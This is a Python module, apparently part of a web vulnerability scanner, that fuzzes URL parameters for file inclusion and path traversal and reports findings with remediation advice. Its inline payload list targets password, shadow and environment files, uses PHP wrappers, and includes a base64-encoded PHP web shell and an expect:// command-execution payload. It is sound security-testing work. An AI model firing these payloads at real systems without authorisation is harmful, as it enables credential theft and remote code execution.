"""
LFI / Path Traversal scanner — step 6.3.
Tests URL parameters and endpoint paths for local file inclusion
and directory traversal vulnerabilities.
Uses ffuf for fuzzing + manual httpx probe for confirmation.
Only triggers on scan_type in ("web", "full").
"""
from __future__ import annotations

import re
import tempfile
import os
import json
from typing import TYPE_CHECKING

from app.scanner.base import Finding, ScanResult, run_cmd

if TYPE_CHECKING:
    from app.scanner.context import ScanContext


# ── LFI payload wordlist (inline — no file dependency) ───────────────────────

_LFI_PAYLOADS = [
    # Linux classics
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../proc/self/cmdline",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    # Null byte + double-encode variants
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%2500",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    # Windows
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    # Expect wrapper (RCE if available)
    "expect://id",
]

# Indicators of successful LFI in response body
_LFI_SUCCESS_RE = re.compile(
    r"root:.*:0:0:|"                       # /etc/passwd
    r"\[boot loader\]|"                    # win.ini
    r"for 16-bit app support|"             # win.ini
    r"\[extensions\]|"                     # win.ini
    r"HTTP_USER_AGENT|SERVER_ADDR|"        # /proc/self/environ
    r"<\?php|base64_decode|eval\(",        # PHP source leak
    re.I,
)

_PHP_WRAPPER_RE = re.compile(r"^[A-Za-z0-9+/]{20,}={0,2}$")  # base64 blob


# ── URL / parameter extraction ────────────────────────────────────────────────

_PARAM_URL_RE = re.compile(r"(https?://\S+\?\S+=)[^\s&]*", re.I)
_FILE_PARAM_RE = re.compile(
    r"[?&](file|path|page|include|dir|document|template|module|load|src|url|"
    r"lang|locale|theme|view|layout|content|data|read|open|fetch|load)=",
    re.I,
)


def _collect_injectable_urls(target: str, all_findings: list[Finding]) -> list[tuple[str, str]]:
    """
    Returns list of (base_url_with_param_placeholder, param_name).
    Prioritises file-related parameter names.
    """
    seen: set[str] = set()
    result: list[tuple[str, str]] = []

    def _add(url: str) -> None:
        m = _FILE_PARAM_RE.search(url)
        if not m:
            # Still grab any parametric URL — we'll fuzz all params
            m2 = re.search(r"[?&](\w+)=", url)
            if not m2:
                return
            param = m2.group(1)
        else:
            param = m.group(1)

        # Replace param value with FUZZ placeholder
        base = re.sub(r"([?&]" + re.escape(param) + r"=)[^&]*", r"\g<1>FUZZ", url)
        key = f"{base}|{param}"
        if key not in seen:
            seen.add(key)
            result.append((base, param))

    for f in all_findings:
        if f.evidence:
            for m in _PARAM_URL_RE.finditer(f.evidence):
                _add(m.group(0).rstrip("."))

        if f.type in ("endpoint", "web", "sqli", "xss") and f.title:
            for m in _PARAM_URL_RE.finditer(f.title):
                _add(m.group(0).rstrip("."))

        if f.type == "osint" and "parameter URL" in (f.title or ""):
            for line in (f.evidence or "").splitlines():
                for m in _PARAM_URL_RE.finditer(line):
                    _add(m.group(0).rstrip("."))

    return result[:20]


# ── ffuf-based LFI fuzzer ─────────────────────────────────────────────────────

def _run_ffuf_lfi(fuzz_url: str, wordlist_path: str, timeout: int = 120) -> list[dict]:
    rc, stdout, stderr = run_cmd(
        [
            "ffuf",
            "-u", fuzz_url,
            "-w", wordlist_path,
            "-mc", "200",
            "-fs", "0",          # filter zero-size responses
            "-t", "20",
            "-timeout", "8",
            "-of", "json",
            "-o", "-",
            "-s",
        ],
        timeout=timeout,
    )
    if rc == -1:
        return []

    results: list[dict] = []
    for line in stdout.splitlines():
        try:
            obj = json.loads(line)
            if "results" in obj:
                results.extend(obj["results"])
            elif "status" in obj:
                results.append(obj)
        except json.JSONDecodeError:
            pass
    return results


# ── httpx manual probe ────────────────────────────────────────────────────────

def _probe_url(url: str, timeout: int = 10) -> tuple[int, str]:
    """GET url, return (status_code, body[:2000])."""
    try:
        import httpx
        r = httpx.get(url, timeout=timeout, follow_redirects=True,
                      headers={"User-Agent": "Mozilla/5.0"})
        return r.status_code, r.text[:2000]
    except Exception:
        return 0, ""


def _confirm_lfi(payload_url: str) -> tuple[bool, str]:
    """Return (confirmed, snippet)."""
    status, body = _probe_url(payload_url)
    if status not in (200, 500):
        return False, ""
    if _LFI_SUCCESS_RE.search(body):
        # Extract a short evidence snippet
        for line in body.splitlines():
            if _LFI_SUCCESS_RE.search(line):
                return True, line.strip()[:200]
        return True, body[:200]
    # PHP wrapper: huge base64 blob in response → source disclosure
    if _PHP_WRAPPER_RE.search(body.strip()):
        return True, f"PHP source leak (base64, {len(body)} bytes)"
    return False, ""


# ── Main entry point ──────────────────────────────────────────────────────────

async def run_lfi(
    ctx: "ScanContext",
    target: str,
    scan_type: str,
    all_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    if scan_type not in ("web", "full"):
        return result

    injectable = _collect_injectable_urls(target, all_findings)

    if not injectable:
        await ctx.log(
            "LFI: no parametric URLs found — skipping",
            level="info", module="lfi",
        )
        return result

    await ctx.log(
        f"LFI: testing {len(injectable)} URL(s) for path traversal / LFI",
        module="lfi",
    )

    # Write inline payload list to a temp file for ffuf
    wl_path = os.path.join(tempfile.gettempdir(), "lfi_payloads.txt")
    with open(wl_path, "w") as fh:
        fh.write("\n".join(_LFI_PAYLOADS))

    confirmed_count = 0

    for fuzz_url, param in injectable:
        await ctx.log(f"  LFI → {fuzz_url[:100]} (param: {param})", module="lfi")

        # First try ffuf for speed
        ffuf_hits = _run_ffuf_lfi(fuzz_url, wl_path)
        candidate_payloads: list[str] = []

        for hit in ffuf_hits:
            payload = hit.get("input", {}).get("FUZZ", "")
            if payload:
                candidate_payloads.append(payload)

        # If ffuf not available or returned nothing — probe manually
        if not candidate_payloads:
            candidate_payloads = _LFI_PAYLOADS[:8]  # probe top 8 manually

        for payload in candidate_payloads[:10]:
            test_url = fuzz_url.replace("FUZZ", payload)
            confirmed, snippet = _confirm_lfi(test_url)

            if confirmed:
                confirmed_count += 1
                severity   = "high"
                cvss_score = 7.5
                is_rce     = "expect://" in payload or "php://input" in payload

                if is_rce:
                    severity   = "critical"
                    cvss_score = 9.8

                await ctx.log(
                    f"  LFI CONFIRMED: {param}={payload[:60]}",
                    level="error", module="lfi",
                )

                result.findings.append(Finding(
                    type="lfi",
                    title=f"{'RCE via PHP wrapper' if is_rce else 'Path Traversal / LFI'}: {fuzz_url[:80]}",
                    severity=severity,
                    description=(
                        f"Parameter '{param}' is vulnerable to "
                        f"{'remote code execution via PHP wrapper' if is_rce else 'local file inclusion / path traversal'}.\n\n"
                        f"URL: {test_url[:300]}\n"
                        f"Payload: {payload}\n"
                        f"Evidence snippet: {snippet}"
                    ),
                    evidence=f"url={test_url[:200]} payload={payload} snippet={snippet[:150]}",
                    cvss_score=cvss_score,
                    cvss_vector=(
                        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        if is_rce else
                        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                    ),
                    remediation=(
                        "Never pass user input directly to file system calls. "
                        "Use an allowlist of permitted filenames/paths. "
                        "Disable PHP wrappers (allow_url_include=Off, allow_url_fopen=Off). "
                        "Apply open_basedir restriction."
                    ),
                ))
                break  # one confirmed finding per URL is enough

        else:
            await ctx.log(f"  LFI: not vulnerable — {fuzz_url[:80]}", level="info", module="lfi")

    await ctx.log(
        f"LFI complete: {confirmed_count}/{len(injectable)} URL(s) vulnerable",
        level="warning" if confirmed_count else "success",
        module="lfi",
    )
    return result
